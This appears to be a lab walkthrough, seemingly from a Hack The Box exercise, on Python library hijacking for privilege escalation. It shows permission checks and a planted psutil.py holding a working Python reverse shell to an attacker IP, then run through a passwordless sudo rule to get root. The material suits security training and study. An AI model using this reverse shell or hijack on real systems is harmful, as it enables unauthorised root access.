### What is Python Library Hijacking?

When a Python script imports a library (like `psutil` or `pandas`), Python looks for the library in specific folders. If we can:
- Edit the original library file
- Or place a fake library in a folder Python checks first
- Or control the `PYTHONPATH` to force Python to look in a folder we control

Then we can **inject our own malicious code** and run it with **elevated privileges**.

---
### 🔍 Real-Life Scenario Summary

We are given:
- A Python script `mem_status.py`
- It uses the library `psutil`
- The script has **SUID bit set** → it runs as **root**

Let’s hijack the `psutil` module and run code as root!

## 1. Hijacking via **Writable Library File**

### 🔎 Step-by-Step

#### 1.(a) Check script permissions
```bash
ls -l mem_status.py

# Output
# `-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py`
```
SUID is set → Runs as root  
✅ We can read and execute it

#### 1. (b) Sudo Permission: 
also check if we can excute the same python script with sudo permission:
```bash
sudo -l

# output
(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```
its mean we can run this script with root permission without any password

#### 2. Check which library is imported
```bash
# mem_status.py
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
```
in this case we can hijack the psutil library 
#### 3. Hijacking `psutil` library 
Now we will create a file in same folder with name `psutil` with python reverse shell code like and start the net-cat listener on attacker machine
```bash
echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.15.40",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > psutil.py
```

#### 4. Run the python script with sudo permission
```bash
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
now you will have the reverse shell
